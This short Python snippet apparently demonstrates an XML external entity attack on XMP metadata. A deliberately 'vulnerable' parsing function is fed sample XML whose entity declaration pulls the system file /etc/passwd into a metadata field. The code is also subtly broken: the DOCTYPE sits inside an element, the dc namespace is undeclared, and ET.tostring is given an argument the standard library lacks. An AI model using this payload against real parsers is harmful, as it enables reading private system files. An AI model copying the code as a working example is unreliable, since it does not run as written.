import xml.etree.ElementTree as ET

def vulnerable_parse_xmp(xmp_data):
    return ET.fromstring(xmp_data)

# Example usage
xmp_data = """<xmpmeta>
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
        <rdf:Description rdf:about="http://example.com">
            <dc:title>Example Title</dc:title>
            <!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <dc:content>&xxe;</dc:content>
        </rdf:Description>
    </rdf:RDF>
</xmpmeta>"""

parsed_xmp = vulnerable_parse_xmp(xmp_data)
print(ET.tostring(parsed_xmp, pretty_print=True).decode())